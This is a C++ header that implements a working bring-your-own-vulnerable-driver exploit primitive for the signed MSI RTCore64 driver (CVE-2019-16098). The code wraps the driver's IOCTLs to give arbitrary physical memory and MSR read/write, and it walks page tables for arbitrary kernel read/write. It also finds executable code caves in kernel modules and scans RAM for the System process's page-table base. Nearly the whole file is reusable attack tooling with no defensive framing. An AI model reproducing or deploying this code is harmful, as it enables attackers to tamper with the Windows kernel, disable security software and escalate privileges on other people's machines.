#pragma once
// RTCore64 BYOVD primitive (CVE-2019-16098, MSI Afterburner driver)
// Device: \\.\RTCore64 (signed by MSI — no test signing needed)
//
// IOCTL codes and structures verified against CVE-2019-16098 disclosure:
//   READ_MEM  = 0x80002048   WRITE_MEM = 0x8000204C
//   READ_MSR  = 0x80002050   WRITE_MSR = 0x80002054
//
// Memory structure: 48 bytes.  Value field is uint32_t → max 4-byte atomic R/W.
// 8-byte reads require two 4-byte IOCTLs.

#include <Windows.h>
#include <winternl.h>
#include <cstdint>
#include <vector>
#include <string>
#include <cstring>
#include <algorithm>
#include <iostream>
#include <memory>

#ifdef min
#undef min
#endif

static constexpr DWORD RTCORE_READ_MEM   = 0x80002048;
static constexpr DWORD RTCORE_WRITE_MEM  = 0x8000204C;
static constexpr DWORD RTCORE_READ_MSR   = 0x80002050;
static constexpr DWORD RTCORE_WRITE_MSR  = 0x80002054;

// ── Structures (packed, verified against CVE-2019-16098) ──────────
#pragma pack(push, 1)
struct RTCoreMemOp {
    uint8_t  pad0[8];      // +0x00
    uint64_t address;      // +0x08
    uint8_t  pad1[8];      // +0x10
    uint32_t readSize;     // +0x18  (1, 2, or 4)
    uint32_t value;        // +0x1C  (32-bit — NOT 64)
    uint8_t  pad2[16];     // +0x20
};
static_assert(sizeof(RTCoreMemOp) == 48, "RTCoreMemOp must be 48 bytes");

struct RTCoreMSROp {
    uint32_t reg;          // +0x00
    uint32_t valueHigh;    // +0x04
    uint32_t valueLow;     // +0x08
};
static_assert(sizeof(RTCoreMSROp) == 12, "RTCoreMSROp must be 12 bytes");
#pragma pack(pop)

// ── Physical R/W (1/2/4 bytes — value field is 32-bit) ───────────
inline bool RtcPhysRead(HANDLE h, uint64_t pa, void* dst, uint32_t sz) {
    if (sz != 1 && sz != 2 && sz != 4) return false;
    RTCoreMemOp r{};
    r.address  = pa;
    r.readSize = sz;
    DWORD got = 0;
    if (!DeviceIoControl(h, RTCORE_READ_MEM, &r, sizeof(r), &r, sizeof(r), &got, nullptr))
        return false;
    memcpy(dst, &r.value, sz);
    return true;
}

inline bool RtcPhysWrite(HANDLE h, uint64_t pa, const void* src, uint32_t sz) {
    if (sz != 1 && sz != 2 && sz != 4) return false;
    RTCoreMemOp w{};
    w.address  = pa;
    w.readSize = sz;
    memcpy(&w.value, src, sz);
    DWORD got = 0;
    return DeviceIoControl(h, RTCORE_WRITE_MEM, &w, sizeof(w), &w, sizeof(w), &got, nullptr) != 0;
}

// 8-byte read via two 4-byte IOCTLs
inline uint64_t RtcRead8(HANDLE h, uint64_t pa) {
    uint32_t lo = 0, hi = 0;
    if (!RtcPhysRead(h, pa, &lo, 4) || !RtcPhysRead(h, pa + 4, &hi, 4))
        return 0;
    return ((uint64_t)hi << 32) | lo;
}

inline bool RtcWrite8(HANDLE h, uint64_t pa, uint64_t val) {
    uint32_t lo = (uint32_t)(val & 0xFFFFFFFF);
    uint32_t hi = (uint32_t)(val >> 32);
    return RtcPhysWrite(h, pa, &lo, 4) && RtcPhysWrite(h, pa + 4, &hi, 4);
}

// ── MSR read/write ────────────────────────────────────────────────
inline uint64_t RtcReadMSR(HANDLE h, uint32_t msr) {
    RTCoreMSROp r{};
    r.reg = msr;
    DWORD got = 0;
    if (!DeviceIoControl(h, RTCORE_READ_MSR, &r, sizeof(r), &r, sizeof(r), &got, nullptr))
        return 0;
    return ((uint64_t)r.valueHigh << 32) | r.valueLow;
}

inline bool RtcWriteMSR(HANDLE h, uint32_t msr, uint64_t val) {
    RTCoreMSROp w{};
    w.reg       = msr;
    w.valueHigh = (uint32_t)(val >> 32);
    w.valueLow  = (uint32_t)(val & 0xFFFFFFFF);
    DWORD got = 0;
    return DeviceIoControl(h, RTCORE_WRITE_MSR, &w, sizeof(w), &w, sizeof(w), &got, nullptr) != 0;
}

// ── V2P: 4-level page-table walk ─────────────────────────────────
inline uint64_t RtcVirtToPhys(HANDLE h, uint64_t cr3, uint64_t va) {
    auto idx = [&](int shift) { return (va >> shift) & 0x1FFULL; };

    uint64_t pml4e = RtcRead8(h, (cr3 & ~0xFFFULL) + idx(39) * 8);
    if (!(pml4e & 1)) return 0;

    uint64_t pdpte = RtcRead8(h, (pml4e & ~0xFFFULL) + idx(30) * 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) return (pdpte & ~0x3FFFFFFFULL) | (va & 0x3FFFFFFF);

    uint64_t pde = RtcRead8(h, (pdpte & ~0xFFFULL) + idx(21) * 8);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) return (pde & ~0x1FFFFFULL) | (va & 0x1FFFFF);

    uint64_t pte = RtcRead8(h, (pde & ~0xFFFULL) + idx(12) * 8);
    if (!(pte & 1)) return 0;
    return (pte & ~0xFFFULL) | (va & 0xFFF);
}

// ── Virtual kernel R/W (cross-page, 4-byte batched) ──────────────
inline bool RtcVirtRead(HANDLE h, uint64_t cr3, uint64_t va, void* dst, size_t n) {
    auto* d = (uint8_t*)dst;
    while (n) {
        uint64_t pa = RtcVirtToPhys(h, cr3, va);
        if (!pa) return false;
        size_t chunk = std::min(n, (size_t)(0x1000 - (pa & 0xFFF)));
        size_t i = 0;
        while (i + 4 <= chunk) {
            uint32_t tmp = 0;
            if (!RtcPhysRead(h, pa + i, &tmp, 4)) return false;
            memcpy(d + i, &tmp, 4);
            i += 4;
        }
        while (i < chunk) {
            if (!RtcPhysRead(h, pa + i, d + i, 1)) return false;
            i++;
        }
        va += chunk; d += chunk; n -= chunk;
    }
    return true;
}

inline bool RtcVirtWrite(HANDLE h, uint64_t cr3, uint64_t va, const void* src, size_t n) {
    const auto* s = (const uint8_t*)src;
    while (n) {
        uint64_t pa = RtcVirtToPhys(h, cr3, va);
        if (!pa) return false;
        size_t chunk = std::min(n, (size_t)(0x1000 - (pa & 0xFFF)));
        size_t i = 0;
        while (i + 4 <= chunk) {
            uint32_t tmp;
            memcpy(&tmp, s + i, 4);
            if (!RtcPhysWrite(h, pa + i, &tmp, 4)) return false;
            i += 4;
        }
        while (i < chunk) {
            if (!RtcPhysWrite(h, pa + i, s + i, 1)) return false;
            i++;
        }
        va += chunk; s += chunk; n -= chunk;
    }
    return true;
}

// ── Code cave finder ─────────────────────────────────────────────
inline uint64_t RtcFindCodeCave(HANDLE h, uint64_t cr3,
                                uint64_t modKernBase, const char* diskPath,
                                size_t neededBytes = 80)
{
    HMODULE hMod = LoadLibraryExA(diskPath, nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!hMod) return 0;

    auto* dos = (IMAGE_DOS_HEADER*)hMod;
    auto* nt  = (IMAGE_NT_HEADERS64*)((uint8_t*)hMod + dos->e_lfanew);
    auto* sec = IMAGE_FIRST_SECTION(nt);
    uint64_t caveVA = 0;

    for (int i = 0; i < nt->FileHeader.NumberOfSections && !caveVA; i++, sec++) {
        if (!(sec->Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
        uint8_t* code = (uint8_t*)hMod + sec->VirtualAddress;
        size_t   sz   = sec->Misc.VirtualSize;

        for (size_t off = 0; off + neededBytes <= sz; off++) {
            bool ok = true;
            for (size_t k = 0; k < neededBytes; k++)
                if (code[off + k] != 0xCC) { ok = false; break; }
            if (!ok) continue;

            uint64_t kva = modKernBase + sec->VirtualAddress + off;
            uint8_t tmp = 0;
            if (!RtcVirtRead(h, cr3, kva, &tmp, 1) || tmp != 0xCC) continue;
            caveVA = kva;
            break;
        }
    }

    FreeLibrary(hMod);
    return caveVA;
}

// ── EPROCESS offsets (Win10 19045) ───────────────────────────────
static constexpr uint32_t RTC_EPROC_CR3   = 0x028;
static constexpr uint32_t RTC_EPROC_PID   = 0x440;
static constexpr uint32_t RTC_EPROC_NAME  = 0x5A8;
static constexpr uint32_t RTC_EPROC_FLINK = 0x448;

// ── CR3 bootstrap: EPROCESS scan + MSR diagnostics ───────────────
inline uint64_t RtcBootstrapCR3(HANDLE h) {
    LARGE_INTEGER t0, t1, freq;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&t0);

    std::cout << "============================================================\n";
    std::cout << "[*] RTCore64 CR3 Bootstrap\n";
    std::cout << "    Driver backend : RTCore64.sys (CVE-2019-16098)\n";
    std::cout << "    IOCTLs         : READ=0x80002048 MSR=0x80002050\n";
    std::cout << "    Max atom read  : 4 bytes (8-byte via 2x4)\n";
    std::cout << "============================================================\n";

    // MSR diagnostics
    uint64_t lstar  = RtcReadMSR(h, 0xC0000082);  // IA32_LSTAR -> KiSystemCall64
    uint64_t gsbase = RtcReadMSR(h, 0xC0000102);  // IA32_KERNEL_GS_BASE -> KPCR
    uint64_t star   = RtcReadMSR(h, 0xC0000081);  // IA32_STAR (SYSCALL segments)

    std::cout << "[*] MSR diagnostics:\n";
    std::cout << "    IA32_STAR                   = 0x" << std::hex << star << "\n";
    std::cout << "    IA32_LSTAR (KiSystemCall64) = 0x" << std::hex << lstar << "\n";
    std::cout << "    IA32_KERNEL_GS_BASE (KPCR)  = 0x" << std::hex << gsbase << "\n";

    bool lstarValid = lstar && (lstar >> 48) == 0xFFFF;
    bool gsbaseValid = gsbase && (gsbase >> 48) == 0xFFFF;

    if (lstarValid)
        std::cout << "[+] IA32_LSTAR valid (kernel VA 0x" << std::hex << lstar << ")\n";
    else
        std::cout << "[!] IA32_LSTAR invalid or zero — MSR read may have failed\n";

    if (gsbaseValid)
        std::cout << "[+] IA32_KERNEL_GS_BASE valid (KPCR VA 0x" << std::hex << gsbase << ")\n";
    else
        std::cout << "[!] IA32_KERNEL_GS_BASE invalid — KPCR not readable via MSR\n";

    // Physical RAM scan ranges (VirtualBox Win10 VM typical layout)
    struct ScanRange { uint64_t start, end; };
    ScanRange ranges[] = {
        { 0x1000,          0x9f000 },
        { 0x100000,        0xdfff0000ULL },
        { 0x100000000ULL,  0x120000000ULL },
    };

    std::cout << "[*] Scanning physical RAM for System EPROCESS...\n";

    struct Candidate { uint64_t pa; uint64_t cr3; };
    std::vector<Candidate> candidates;
    uint64_t pagesScanned = 0;

    for (auto& range : ranges) {
        for (uint64_t pa = range.start; pa < range.end; pa += 0x1000) {
            pagesScanned++;
            if ((pagesScanned & 0xFFFF) == 0)
                std::cout << "    ... scanned 0x" << std::hex << pagesScanned << " pages (PA=0x" << pa << ")\r" << std::flush;

            // Fast check: read first 4 bytes of ImageFileName ("Syst" = 0x74737953 LE)
            uint32_t nameHead = 0;
            if (!RtcPhysRead(h, pa + RTC_EPROC_NAME, &nameHead, 4)) continue;
            if (nameHead != 0x74737953) continue;  // "Syst"

            // Confirm remaining "em"
            uint16_t nameTail = 0;
            if (!RtcPhysRead(h, pa + RTC_EPROC_NAME + 4, &nameTail, 2)) continue;
            if (nameTail != 0x6D65) continue;  // "em"

            // Check PID == 4
            uint32_t pid = 0;
            if (!RtcPhysRead(h, pa + RTC_EPROC_PID, &pid, 4)) continue;
            if (pid != 4) continue;

            // Read DirectoryTableBase
            uint64_t cr3 = RtcRead8(h, pa + RTC_EPROC_CR3);
            if (!cr3 || (cr3 & 0xFFF) || cr3 > 0x200000000ULL) continue;

            // ActiveProcessLinks.Flink sanity — should be kernel VA
            uint64_t flink = RtcRead8(h, pa + RTC_EPROC_FLINK);
            if (!flink || (flink >> 48) != 0xFFFF) continue;

            candidates.push_back({pa, cr3});
            std::cout << "\n[+] System EPROCESS PA=0x" << std::hex << pa
                      << " CR3=0x" << cr3 << " Flink=0x" << flink << "\n";
        }
    }
    QueryPerformanceCounter(&t1);
    double scanMs = (double)(t1.QuadPart - t0.QuadPart) * 1000.0 / freq.QuadPart;

    std::cout << "\n[*] Scanned 0x" << std::hex << pagesScanned << std::dec
              << " pages (" << (int)scanMs << " ms), found "
              << candidates.size() << " candidate(s)\n";

    if (candidates.empty()) return 0;

    // Validate each: PML4[256] present (kernel half of address space)
    for (auto& c : candidates) {
        uint64_t pml4_256 = RtcRead8(h, c.cr3 + 256 * 8);

        std::cout << "[*] Validating CR3=0x" << std::hex << c.cr3 << ":\n";

        if (!(pml4_256 & 1)) {
            std::cout << "    PML4[256] = 0x" << std::hex << pml4_256
                      << " (NOT PRESENT) — skipping\n";
            continue;
        }

        // Read a few more PML4 entries to assess quality
        uint64_t pml4_0 = RtcRead8(h, c.cr3);
        uint64_t pml4_511 = RtcRead8(h, c.cr3 + 511 * 8);
        std::cout << "    PML4[0]   = 0x" << std::hex << pml4_0
                  << (pml4_0 & 1 ? " (P)" : " (NP)") << "\n";
        std::cout << "    PML4[256] = 0x" << std::hex << pml4_256
                  << (pml4_256 & 1 ? " (P)" : " (NP)") << "\n";
        std::cout << "    PML4[511] = 0x" << std::hex << pml4_511
                  << (pml4_511 & 1 ? " (P)" : " (NP)") << "\n";

        // Cross-validate against IA32_LSTAR if available
        if (lstarValid) {
            uint64_t lstarPA = RtcVirtToPhys(h, c.cr3, lstar);
            if (lstarPA) {
                std::cout << "    IA32_LSTAR VA->PA: 0x" << std::hex << lstar
                          << " -> 0x" << lstarPA << " [OK]\n";

                // Read first 4 bytes at LSTAR PA for extra validation
                uint32_t lstarCode = 0;
                RtcPhysRead(h, lstarPA, &lstarCode, 4);
                std::cout << "    KiSystemCall64 first DWORD: 0x" << std::hex << lstarCode << "\n";
            } else {
                std::cout << "    IA32_LSTAR VA->PA: FAILED (page table walk returned 0)\n";
            }
        }

        // If KPCR is valid, try to walk it
        if (gsbaseValid) {
            uint64_t gsPA = RtcVirtToPhys(h, c.cr3, gsbase);
            if (gsPA)
                std::cout << "    KPCR VA->PA: 0x" << std::hex << gsbase
                          << " -> 0x" << gsPA << " [OK]\n";
            else
                std::cout << "    KPCR VA->PA: FAILED\n";
        }

        QueryPerformanceCounter(&t1);
        double totalMs = (double)(t1.QuadPart - t0.QuadPart) * 1000.0 / freq.QuadPart;
        std::cout << "[+] CR3 bootstrap complete in " << (int)totalMs << " ms\n";
        std::cout << "============================================================\n";

        return c.cr3;
    }

    std::cout << "[!] PML4 validation failed for all, using first candidate\n";
    return candidates[0].cr3;
}

// ── Session state + OpenRtCore ────────────────────────────────────
struct RtCoreSession {
    HANDLE dev = INVALID_HANDLE_VALUE;
    uint64_t cr3 = 0;
};

inline KernelPrimitives OpenRtCore(std::string& err)
{
    HANDLE h = CreateFileA("\\\\.\\RTCore64",
                           GENERIC_READ | GENERIC_WRITE,
                           FILE_SHARE_READ | FILE_SHARE_WRITE,
                           nullptr, OPEN_EXISTING, 0, nullptr);
    if (h == INVALID_HANDLE_VALUE) {
        err = "OpenRtCore: CreateFile failed err=" + std::to_string(GetLastError()) +
              " (RtCoreSvc service loaded?)";
        return {};
    }

    // Smoke test
    uint32_t smoke = 0;
    if (!RtcPhysRead(h, 0, &smoke, 4)) {
        CloseHandle(h);
        err = "OpenRtCore: smoke test read failed (IOCTL rejected)";
        return {};
    }
    std::cout << "[+] RTCore64 smoke test OK (PA 0x0 = 0x" << std::hex << smoke << ")\n";

    uint64_t cr3 = RtcBootstrapCR3(h);
    if (!cr3) {
        CloseHandle(h);
        err = "OpenRtCore: CR3 bootstrap failed";
        return {};
    }

    std::cout << "[+] RTCore64 opened, CR3=0x" << std::hex << cr3 << std::dec << "\n";

    auto sp = std::make_shared<RtCoreSession>();
    sp->dev = h;
    sp->cr3 = cr3;

    KernelPrimitives p;

    p.ReadKernelMemory = [sp](void* dst, uint64_t src, size_t sz) -> bool {
        return RtcVirtRead(sp->dev, sp->cr3, src, dst, sz);
    };

    p.WriteKernelMemory = [sp](uint64_t dst, const void* src, size_t sz) -> bool {
        return RtcVirtWrite(sp->dev, sp->cr3, dst, src, sz);
    };

    p.AllocateKernelMemory = nullptr;

    p.ReadPhysicalMemory = [sp](void* dst, uint64_t pa, size_t sz) -> bool {
        auto* d = (uint8_t*)dst;
        size_t i = 0;
        while (i + 4 <= sz) {
            uint32_t tmp = 0;
            if (!RtcPhysRead(sp->dev, pa + i, &tmp, 4)) return false;
            memcpy(d + i, &tmp, 4);
            i += 4;
        }
        while (i < sz) {
            if (!RtcPhysRead(sp->dev, pa + i, d + i, 1)) return false;
            i++;
        }
        return true;
    };

    p.cr3 = cr3;
    p.UpdateCR3 = [sp](uint64_t newCr3) { sp->cr3 = newCr3; };

    return p;
}
